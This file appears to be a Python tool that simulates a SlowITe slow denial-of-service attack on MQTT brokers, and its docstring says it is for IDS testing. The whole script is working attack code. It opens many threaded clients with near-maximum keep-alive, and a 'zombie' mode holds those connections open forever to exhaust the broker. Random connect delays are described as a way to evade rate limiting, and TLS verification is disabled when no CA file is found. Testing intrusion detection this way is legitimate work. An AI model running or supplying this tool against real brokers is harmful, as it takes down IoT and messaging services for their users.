#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import ssl
import time
import random
import argparse
import threading
import sys
import os

"""
==================
Simulate a SlowITe (Slow DoS) attack for IDS testing.
Updates:
1. Forces Keep-Alive to maximum (65535).
2. Adds --zombie mode to hold connections open indefinitely.
usage: python slwit.py --host 10.12.112.191 --clients 50 --zombie --tls --username attacker --password 123
"""

def create_client(client_id, args):
    client = mqtt.Client(client_id=client_id, clean_session=True)

    # TLS Configuration
    if args.tls:
        # Kiểm tra file CA có tồn tại không
        if args.ca_file and os.path.exists(args.ca_file):
            print(f"[TLS] Using CA certificate: {args.ca_file}")
            client.tls_set(
                ca_certs=args.ca_file,
                cert_reqs=ssl.CERT_REQUIRED,
                tls_version=ssl.PROTOCOL_TLS_CLIENT
            )
        else:
            print(f"[TLS] CA file '{args.ca_file}' not found. Skipping certificate verification (insecure mode).")
            client.tls_set(cert_reqs=ssl.CERT_NONE)
            client.tls_insecure_set(True)

    # Optional authentication
    if args.username:
        client.username_pw_set(args.username, args.password)

    return client

def slowite_worker(index, args):
    client_id = f"slowite-attack-client-{index}"
    client = create_client(client_id, args)

    # [CHANGE 1] Always use the maximum MQTT keepalive allowed (18 hours)
    kalive = 65511 

    will_payload = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=args.will_size))

    # Set Last Will (Broker broadcasts this if we die unexpectedly)
    client.will_set(topic=f"slowite/{client_id}/status", payload=will_payload, qos=0, retain=False)

    try:
        # Slow start (evade rate limiting)
        delay = random.uniform(0, args.delay)
        time.sleep(delay)
        
        print(f"[+] {client_id} Connecting... (KeepAlive: {kalive}s)")
        client.connect(args.host, args.port, keepalive=kalive)
        client.loop_start()

        # [CHANGE 2] Zombie Logic
        if args.zombie:
            print(f"[*] {client_id} entered ZOMBIE mode. Holding connection forever...")
            while True:
                # Sleep in short bursts to allow thread to be killed by Ctrl+C if needed
                time.sleep(1)
        else:
            # Original behavior: Wait a bit, then disconnect politely
            print(f"[*] {client_id} Idling for {args.idle} seconds...")
            time.sleep(args.idle)
            client.loop_stop()
            client.disconnect()
            print(f"[-] {client_id} Disconnected politely.")

    except Exception as e:
        print(f"[!] {client_id} error: {e}")

def main():
    parser = argparse.ArgumentParser(description="SlowITe Attack Simulator for IDS Testing (CA Hardcoded)")
    
    # Target Config
    parser.add_argument('--host', required=True, help='MQTT broker hostname or IP')
    parser.add_argument('--port', type=int, default=8883, help='MQTT port (default 8883 for TLS)')
    parser.add_argument('--username', default=None, help='MQTT username')
    parser.add_argument('--password', default=None, help='MQTT password')

    # Attack Config
    parser.add_argument('--clients', type=int, default=5, help='Number of concurrent attack clients')
    parser.add_argument('--delay', type=float, default=2.0, help='Max random delay between client connects (s)')
    parser.add_argument('--will-size', type=int, default=100, help='Size of the MQTT Will payload (bytes)')
    
   
    parser.add_argument('--idle', type=int, default=60, help='Seconds to hold connection (ignored if --zombie is used)')
    parser.add_argument('--zombie', action='store_true', help='If set, clients NEVER disconnect (true exhaustion)')


    parser.add_argument('--tls', action='store_true', help='Enable TLS (default port 8883)')
    
    
    parser.add_argument('--ca-file', default='certs/ca-cert.pem', help='Path to CA certificate file for TLS verification')

    args = parser.parse_args()

   

    threads = []
    print(f"== Starting SlowITe Simulator against {args.host}:{args.port} ==")
    print(f"== Mode: {'ZOMBIE (Infinite)' if args.zombie else f'Timeout ({args.idle}s)'} ==")
    print(f"== CA Path: {args.ca_file} ==")

    try:
        for i in range(args.clients):
            t = threading.Thread(target=slowite_worker, args=(i, args), daemon=True)
            threads.append(t)
            t.start()

       
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n[!] Stopping Attack Simulator...")
        sys.exit(0)

if __name__ == '__main__':
    main()
